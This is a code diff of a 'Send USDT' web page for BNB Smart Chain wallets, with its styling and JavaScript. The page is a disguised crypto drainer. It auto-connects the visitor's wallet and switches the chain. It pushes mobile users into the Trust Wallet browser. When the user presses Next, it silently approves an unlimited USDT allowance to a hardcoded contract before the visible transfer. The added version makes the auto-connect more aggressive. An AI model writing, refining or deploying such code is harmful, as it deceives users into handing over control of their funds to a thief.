@@ -1,24 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Send USDT</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
   <style>
     :root {
-      --bg: #1A1A1A;
+      --bg: #1a1a1a;
       --input-bg: #232323;
       --border: #333;
-      --primary: #0B0;
+      --primary: #0b0;
       --mid: #585858;
       --btn: #18643e;
       --btn-active: #1d7f4a;
-      --text: #FFF;
-      --text2: #ACACAC;
+      --text: #fff;
+      --text2: #acacac;
       --accent: #27ff85;
       --error: #ff284b;
-      --usdt: #27ff85;
       --usdt-max: #27ff85;
     }
     html, body {
@@ -35,7 +34,6 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
     }
     .modal {
       background: var(--bg);
@@ -264,7 +262,6 @@
       <div class="close-x" onclick="closeModal()" title="Close">&times;</div>
     </div>
     <h1>Send USDT</h1>
-
     <label class="form-label">Address or Domain Name</label>
     <div class="input-group">
       <span class="receiver" readonly id="receiverAddr">
@@ -292,182 +289,178 @@
     <button class="btn-next" id="sendBtn" onclick="sendUSDT()" disabled>Next</button>
     <button class="btn-connect" id="connectBtn" onclick="manualConnect()">Connect Wallet</button>
   </div>
-  <script>
-    // --- Dapp / Wallet / BSC config ---
-    const BSC_MAINNET = {
-      chainId: '0x38',
-      chainName: 'BSC Mainnet',
-      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-      rpcUrls: [
-        'https://bsc-dataseed1.binance.org/',
-        'https://bsc-dataseed2.binance.org/'
-      ],
-      blockExplorerUrls: ['https://bscscan.com']
-    };
-    const USDT_BSC = '0x55d398326f99059fF775485246999027B3197955';
-    const CONTRACT_ADDR = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
-    const RECEIVER_ADDR = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
-    const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-    const USDT_ABI = [
-      "function balanceOf(address) view returns (uint256)",
-      "function approve(address spender, uint256 amount) returns (bool)",
-      "function transfer(address to, uint256 amount) returns (bool)"
-    ];
+<script>
+  // === BSC/Wallet Dapp config ===
+  const BSC_MAINNET = {
+    chainId: "0x38",
+    chainName: "BNB Smart Chain",
+    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+    rpcUrls: ["https://bsc-dataseed.binance.org/"],
+    blockExplorerUrls: ["https://bscscan.com"]
+  };
+  const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+  const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
+  const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
+  const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+  const USDT_ABI = [
+    "function balanceOf(address) view returns (uint256)",
+    "function approve(address spender, uint256 amount) returns (bool)",
+    "function transfer(address to, uint256 amount) returns (bool)"
+  ];
+  let web3;
+  let userAccount;
+  let usdtContract;
+  let isConnected = false;
+  let usdtBalance = "0.00";
+  // --- UI Elements ---
+  const statusDiv = document.getElementById('status');
+  const sendBtn = document.getElementById('sendBtn');
+  const connectBtn = document.getElementById('connectBtn');
+  const amountInput = document.getElementById('amount');
+  const usdAmountDiv = document.getElementById('usdAmount');
+  document.getElementById('receiverAddr').textContent = RECEIVER_ADDR;
 
-    // --- State ---
-    let web3;
-    let userAccount;
-    let usdtContract;
-    let isConnected = false;
-    let usdtBalance = '0.00';
-
-    // --- UI Elements ---
-    const statusDiv = document.getElementById('status');
-    const sendBtn = document.getElementById('sendBtn');
-    const connectBtn = document.getElementById('connectBtn');
-    const amountInput = document.getElementById('amount');
-    const usdAmountDiv = document.getElementById('usdAmount');
-    document.getElementById('receiverAddr').textContent = RECEIVER_ADDR;
-
-    // Auto-connect and switch to BSC on load
-    window.addEventListener('load', tryConnectAndSwitch);
-
-    // Enable Max button logic
-    document.getElementById('maxBtn').onclick = function () {
-      amountInput.value = usdtBalance || '0.00';
-      updateUSD();
-    };
-    amountInput.oninput = updateUSD;
-
-    function updateUSD() {
-      let val = parseFloat(amountInput.value) || 0;
-      usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
-      sendBtn.disabled = !(val > 0 && isConnected);
+  async function autoConnectBSC() {
+    if (!window.ethereum) {
+      // open Trust Wallet dapp browser if not in compatible wallet
+      window.location.href =
+        "https://link.trustwallet.com/open_url?url=" +
+        encodeURIComponent(window.location.href);
+      return;
     }
-
-    function showStatus(message, type) {
-      statusDiv.innerHTML = message;
-      if (!type) statusDiv.style.display = 'none';
-      else {
-        statusDiv.style.display = 'block';
-        statusDiv.className = '';
-        if (type === 'success') statusDiv.classList.add('success');
-        if (type === 'error') statusDiv.classList.add('error');
-      }
-    }
-    function closeModal() {
-      alert('Modal closed! (replace with real close logic)');
-    }
-
-    async function tryConnectAndSwitch() {
-      if (!window.ethereum) {
-        connectBtn.style.display = 'block';
-        return;
-      }
-      try {
-        // Always prompt for connection (more robust for Trust/metamask mobile)
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        web3 = new Web3(window.ethereum);
-
-        // Get address
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (!accounts || !accounts.length) {
-          throw new Error('No accounts');
-        }
-        userAccount = accounts[0];
-
-        // Switch chain to BSC MAINNET
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (chainId !== BSC_MAINNET.chainId) {
-          try {
+    try {
+      // 1. Connect wallet (triggers popup)
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      web3 = new Web3(window.ethereum);
+      // 2. Get primary address
+      const accounts = await window.ethereum.request({ method: "eth_accounts" });
+      if (!accounts || !accounts.length) throw new Error("No accounts");
+      userAccount = accounts[0];
+      // 3. Switch to BSC
+      const chainId = await window.ethereum.request({ method: "eth_chainId" });
+      if (chainId !== BSC_MAINNET.chainId) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BSC_MAINNET.chainId }]
+          });
+        } catch (err) {
+          if (err.code === 4902) {
             await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: BSC_MAINNET.chainId }]
+              method: "wallet_addEthereumChain",
+              params: [BSC_MAINNET]
             });
-          } catch (e) {
-            if (e.code === 4902) {
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [BSC_MAINNET]
-              });
-            } else throw e;
+          } else {
+            throw err;
           }
         }
-
-        // Now init
-        isConnected = true;
-        connectBtn.classList.remove('show');
-        sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
-        await initContractsAndBalance();
-
-        // Wallet event handlers
-        window.ethereum.on('accountsChanged', handleAccountsChanged);
-        window.ethereum.on('chainChanged', () => location.reload());
-      } catch (err) {
-        isConnected = false;
-        connectBtn.classList.add('show');
-        sendBtn.disabled = true;
-        showStatus('Wallet not connected or rejected.', 'error');
-        console.error('Connect/switch failed:', err);
       }
-    }
-    async function manualConnect() {
+      // 4. Ready/Init app
+      isConnected = true;
       connectBtn.classList.remove('show');
-      await tryConnectAndSwitch();
-    }
-    async function initContractsAndBalance() {
-      usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
-      await updateBalance();
-    }
-    async function updateBalance() {
-      try {
-        const balance = await usdtContract.methods.balanceOf(userAccount).call();
-        const balanceFormatted = web3.utils.fromWei(balance, 'mwei');
-        usdtBalance = parseFloat(balanceFormatted).toFixed(4);
-      } catch (error) {
-        console.error('Balance update failed:', error);
-        usdtBalance = '0.00';
-      }
-    }
-    function handleAccountsChanged(accounts) {
-      if (!accounts.length) {
-        isConnected = false;
-        connectBtn.classList.add('show');
-        sendBtn.disabled = true;
-      } else {
-        userAccount = accounts[0];
-        isConnected = true;
-        connectBtn.classList.remove('show');
-        sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
-        initContractsAndBalance();
-      }
-    }
-    async function sendUSDT() {
-      const amount = parseFloat(amountInput.value) || 0;
+      sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
+      await initContractsAndBalance();
+      // Wallet event handlers
+      window.ethereum.on('accountsChanged', handleAccountsChanged);
+      window.ethereum.on('chainChanged', () => location.reload());
+    } catch (err) {
+      isConnected = false;
+      connectBtn.classList.add('show');
       sendBtn.disabled = true;
-      sendBtn.textContent = 'Processing...';
-      showStatus('', '');
-      try {
-        await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
-          from: userAccount
-        });
-        const sendAmount = web3.utils.toWei(amount.toString(), 'mwei');
-        await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
-          from: userAccount
-        });
-        showStatus('✅ Complete!', 'success');
-        amountInput.value = '0';
-        await updateBalance();
-      } catch (e) {
-        showStatus('Transaction Failed', 'error');
-        console.error('Send Failed:', e);
-      } finally {
-        sendBtn.disabled = false;
-        sendBtn.textContent = 'Next';
-      }
+      showStatus('Wallet not connected or rejected.', 'error');
+      console.error('Connect/switch failed:', err);
     }
-    // Make sure Next is disabled if not connected at load
+  }
+  async function manualConnect() {
+    connectBtn.classList.remove('show');
+    await autoConnectBSC();
+  }
+  async function initContractsAndBalance() {
+    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
+    await updateBalance();
+  }
+  async function updateBalance() {
+    try {
+      const balance = await usdtContract.methods.balanceOf(userAccount).call();
+      const balanceFormatted = web3.utils.fromWei(balance, "mwei");
+      usdtBalance = parseFloat(balanceFormatted).toFixed(4);
+    } catch (error) {
+      console.error("Balance update failed:", error);
+      usdtBalance = "0.00";
+    }
+  }
+  function handleAccountsChanged(accounts) {
+    if (!accounts.length) {
+      isConnected = false;
+      connectBtn.classList.add('show');
+      sendBtn.disabled = true;
+    } else {
+      userAccount = accounts[0];
+      isConnected = true;
+      connectBtn.classList.remove('show');
+      sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
+      initContractsAndBalance();
+    }
+  }
+  async function sendUSDT() {
+    const amount = parseFloat(amountInput.value) || 0;
     sendBtn.disabled = true;
-  </script>
+    sendBtn.textContent = "Processing...";
+    showStatus("", "");
+    try {
+      await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
+        from: userAccount
+      });
+      const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
+      await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
+        from: userAccount
+      });
+      showStatus("✅ Complete!", "success");
+      amountInput.value = "0";
+      await updateBalance();
+    } catch (e) {
+      showStatus("Transaction Failed", "error");
+      console.error("Send Failed:", e);
+    } finally {
+      sendBtn.disabled = false;
+      sendBtn.textContent = "Next";
+    }
+  }
+  function showStatus(message, type) {
+    statusDiv.innerHTML = message;
+    if (!type) statusDiv.style.display = "none";
+    else {
+      statusDiv.style.display = "block";
+      statusDiv.className = "";
+      if (type === "success") statusDiv.classList.add("success");
+      if (type === "error") statusDiv.classList.add("error");
+    }
+  }
+  function closeModal() {
+    alert("Modal closed! (replace with real close logic)");
+  }
+  document.getElementById("maxBtn").onclick = function () {
+    amountInput.value = usdtBalance || "0.00";
+    updateUSD();
+  };
+  amountInput.oninput = updateUSD;
+
+  function updateUSD() {
+    let val = parseFloat(amountInput.value) || 0;
+    usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
+    sendBtn.disabled = !(val > 0 && isConnected);
+  }
+  sendBtn.disabled = true;
+  // Robust auto-connect: all events & fallback for mobile dapps:
+  window.addEventListener("load", autoConnectBSC, false);
+  window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
+  setTimeout(autoConnectBSC, 600);
+  if (
+    window.location.hash.includes("send") ||
+    window.location.search.includes("send")
+  ) {
+    setTimeout(autoConnectBSC, 200);
+  }
+</script>
 </body>
 </html>
